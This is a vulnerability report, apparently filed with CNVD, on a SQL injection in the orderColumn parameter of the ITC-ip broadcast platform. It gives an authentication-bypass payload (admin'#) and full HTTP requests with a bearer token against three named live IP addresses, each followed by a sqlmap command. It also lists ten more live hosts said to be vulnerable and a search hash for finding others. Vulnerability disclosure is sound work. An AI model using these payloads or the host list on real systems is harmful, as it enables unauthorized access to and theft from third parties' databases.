sql injection exists in ITC-ip service broadcast platform of Guangdong Paulan Electronics Co., LTD

Vulnerability Description 

There is sql injection in the background of ITC-ip service broadcasting platform of Guangdong Baolun Electronics Co., LTD. Attackers can obtain sensitive database information through this vulnerability

Certificate of Company assets

![img](file:///C:\Users\陈诺\AppData\Local\Temp\ksohtml29032\wps1.jpg) 

https://pa.itc-pa.cn/

Affects Version: v2.0

Influence routing:

/api/v2/maps?page=1&limit=10&orderColumn=id\*&orderType=desc&likeName=

injection parameter:orderColumn

Space mapping： icon_hash="-568806419"

![img](file:///C:\Users\陈诺\AppData\Local\Temp\ksohtml29032\wps2.jpg) 

Note: The vulnerability needs to log in to the background to obtain valid credentials to be carried out, you can use the front desk universal password    -admin‘#  Password-free access

Example I

 

 

http://60.170.49.111:81/login

use     admin’#/123456   Login successfully

![img](file:///C:\Users\陈诺\AppData\Local\Temp\ksohtml29032\wps3.jpg) 

Call the following interface for sql injection, the cookie is time-sensitive, please review and replace it by yourself

GET /api/v2/maps?page=1&limit=10&orderColumn=id*&orderType=desc&likeName= HTTP/1.1

Host: 60.170.49.111:81

Accept: application/json, text/plain, */*

X-Requested-With: XMLHttpRequest

authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MTYzOTgwOTgsImlhdCI6MTcxNjM5MDU5OCwiaXNzIjoiSVAiLCJwbGF0Zm9ybSI6IndlYiIsInN1YiI6ImFsbCIsInR5cCI6IkpXVCIsInVzZXJzX2lkIjoyfQ.bap1Bl--bYOVdzaFvQCLVPLSSHCb43XEfacMzcOnr5k

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0

Referer: http://60.170.49.111:81/monitor/map

Accept-Encoding: gzip, deflate

Accept-Language: zh-CN,zh;q=0.9

Connection: close

 

 

 

***\*python sqlmap.py -r ../url.txt --batch\**** 

![img](file:///C:\Users\陈诺\AppData\Local\Temp\ksohtml29032\wps4.jpg) 

Instance II

[***\*http://110.53.52.41:82/login\****](http://110.53.52.41:82/login)

use admin'# / 123456 Login successfully

![img](file:///C:\Users\陈诺\AppData\Local\Temp\ksohtml29032\wps5.jpg) 

Call the following interface for sql injection, the cookie is time-sensitive, please review and replace it by yourself

 

***\*GET /api/v2/maps?page=1&limit=10&orderColumn=id\*&orderType=desc&likeName= HTTP/1.1\****

***\*Host: 110.53.52.41:82\****

***\*Accept: application/json, text/plain, \*/\*\****

***\*X-Requested-With: XMLHttpRequest\****

***\*authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MTYzOTgwOTgsImlhdCI6MTcxNjM5MDU5OCwiaXNzIjoiSVAiLCJwbGF0Zm9ybSI6IndlYiIsInN1YiI6ImFsbCIsInR5cCI6IkpXVCIsInVzZXJzX2lkIjoyfQ.bap1Bl--bYOVdzaFvQCLVPLSSHCb43XEfacMzcOnr5k\****

***\*User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0\****

***\*Referer: http://60.170.49.111:81/monitor/map\****

***\*Accept-Encoding: gzip, deflate\****

***\*Accept-Language: zh-CN,zh;q=0.9\****

***\*Connection: close\****

 

 

 

***\*python sqlmap.py -r ../url.txt --batch\**** 

![img](file:///C:\Users\陈诺\AppData\Local\Temp\ksohtml29032\wps6.jpg) 

***Instance Ⅲ***

[***\*http://111.34.17.42:81/login\****](http://111.34.17.42:81/login)

*use admin'# / 123456 Login successfully*

![img](file:///C:\Users\陈诺\AppData\Local\Temp\ksohtml29032\wps7.jpg) 

Call the following interface for sql injection, the cookie is time-sensitive, please review and replace it by yourself

 

GET /api/v2/maps?page=1&limit=10&orderColumn=id*&orderType=desc&likeName= HTTP/1.1

Host: 111.34.17.42:81

Accept: application/json, text/plain, */*

X-Requested-With: XMLHttpRequest

authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MTYzOTgwOTgsImlhdCI6MTcxNjM5MDU5OCwiaXNzIjoiSVAiLCJwbGF0Zm9ybSI6IndlYiIsInN1YiI6ImFsbCIsInR5cCI6IkpXVCIsInVzZXJzX2lkIjoyfQ.bap1Bl--bYOVdzaFvQCLVPLSSHCb43XEfacMzcOnr5k

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0

Referer: http://60.170.49.111:81/monitor/map

Accept-Encoding: gzip, deflate

Accept-Language: zh-CN,zh;q=0.9

Connection: close

 

***\*python sqlmap.py -r ../url.txt --batch\****

![img](file:///C:\Users\陈诺\AppData\Local\Temp\ksohtml29032\wps8.jpg) 

 

Other cases

\4. http://221.182.106.148:81/

\5. http://218.206.129.237:81/

\6. http://120.236.127.42:81/

\7. http://118.121.231.180:8181/login

\8. http://blojj2.sfsyxx.cn:81/login

\9. http://60.170.49.111:81/login

\10. http://58.42.97.3:81/login

\11. http://47.109.137.239/login

\12. http://61.157.98.107:8025/audio/media

\13. http://qjjsxy.com:81/login

 

# CNVD certificate number

CNVD-YCGW-202405084002

